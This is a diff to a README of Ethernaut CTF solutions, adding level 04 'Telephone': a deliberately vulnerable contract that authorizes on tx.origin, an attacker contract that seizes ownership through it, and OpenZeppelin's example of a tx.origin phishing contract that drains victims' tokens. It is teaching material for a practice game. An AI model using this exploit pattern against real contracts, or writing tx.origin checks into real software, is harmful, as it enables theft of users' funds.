@@ -44,6 +44,16 @@ My [Ethernaut](https://ethernaut.openzeppelin.com/) CTF Solutions.
 </ol>
 </details>
 
+<details>
+<summary>
+<a href="#04-telephone">04. Telephone</a>
+</summary>
+<ol>
+    <li><a href="./contracts/04-telephone/">Contracts</a></li>
+    <li><a href="./scripts/04-telephone.ts">Script</a></li>
+</ol>
+</details>
+
 ## 00. Hello Ethernaut
 
 This is a warm-up task. Call `await contract.info()` in the console and follow the instructions.
@@ -453,3 +463,100 @@ Some other options include using Bitcoin block headers (verified through [BTC Re
 </details>
 
 <a href='./contracts/03-coin-flip/'>Contracts</a> | <a href='./scripts/03-coin-flip.ts'>Script</a>
+
+## 04. Telephone
+
+### Challenge
+
+Claim ownership of the contract below to complete this level.
+
+<details>
+  <summary>Instance</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+```
+
+</details>
+
+### Solution
+
+<details>
+  <summary>Description</summary>
+
+`tx.origin != msg.sender` gives the right to change the overner. This check will return `true` only if the CA (contract address) calls this function and not EOA (externally owned address).
+
+To do this, we will write an attacker contract and run it in [Remix Online](https://remix.ethereum.org/).
+
+</details>
+
+<details>
+  <summary>Attacker Contract</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import './Telephone.sol';
+
+contract TelephoneAttacker {
+  Telephone private _telephone;
+
+  constructor(Telephone telephone) {
+    _telephone = telephone;
+  }
+
+  function changeOwner() public {
+    _telephone.changeOwner(msg.sender);
+  }
+}
+
+```
+
+</details>
+
+<details>
+  <summary>Comments From OpenZeppelin</summary>
+
+While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).
+
+An example of a possible attack is outlined below.
+
+1. Use `tx.origin` to determine whose tokens to transfer, e.g.
+
+```solidity
+function transfer(address _to, uint _value) {
+  tokens[tx.origin] -= _value;
+  tokens[_to] += _value;
+}
+```
+
+2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.
+
+```solidity
+function () payable {
+  token.transfer(attackerAddress, 10000);
+}
+```
+
+3. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
+
+</details>
+
+<a href='./contracts/04-telephone/'>Contracts</a> | <a href='./scripts/04-telephone.ts'>Script</a>
